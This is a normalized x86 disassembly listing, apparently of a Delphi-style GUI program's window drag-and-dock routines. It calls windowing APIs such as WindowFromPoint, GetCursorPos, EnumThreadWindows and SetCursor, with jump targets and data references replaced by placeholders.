mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4467b4
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4467b4
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_446894
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_446900
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_446d50
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_445e6c
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_44f7b4
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_44f7b4
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44f7b4
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403564
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_446894
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_44f7b4
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_44f7b4
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_446a98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_44f7b4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44f7b4
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_446adc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4462f4
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_446900
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4188a0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_44f7b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_446a98
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403564
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44e2e4
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_446264
sub_446c38
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4188fc
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418790
mov edx edi
mov eax [ rw-data ]
call sub_418744
jmp r-xdata
sub_446c98
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_446cf0
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404624
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_445e38
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_446d50
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_446cf0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_446d7c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_446adc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_446d50
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_446c98
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_44f7b4
mov [ esi ] eax
sub_446dcc
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_446c98
cmp eax 0x1
sbb eax eax
inc eax
sub_446e08
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44e250
test eax eax
je r-xdata
mov eax esi
call sub_44e250
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_447838
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4188a0
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4188fc
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44e264
mov edi eax
jmp r-xdata
sub_446e9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_446d7c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_451274
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_446dcc
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_446dcc
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_448af8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_446dcc
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a94
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45125c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_446e08
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403564
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_45135c
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_451274
jmp r-xdata
mov eax [ rw-data ]
call sub_4513d0
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a94
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_448af8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403564
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403564
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_408110
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44716c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_446398
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_451274
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_446e9c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4472dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_447481
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403564
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403564
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4466a0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44716c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_446588
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_44f7b4
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41723c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_448acc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_41723c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_4474a0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403564
mov ebx eax
sub_447514
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4477e0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44776e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4463e0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403518
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_4474a0
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_446dcc
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_4513d0
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447775
mov eax [ rw-data ]
call sub_403368
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_45fd40
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44a180
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_446c98
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_4639ac
sub_447775
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4034f4
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_447804
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_445e6c
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_447838
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_447804
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_448af8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44d0a0
test eax eax
je r-xdata
mov esi eax
sub_447880
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418744
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx ] eax
sub_4478a8
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418a3c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403368
xor eax eax
mov [ ebx ] eax
sub_4478c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4478f8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4479a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
inc eax
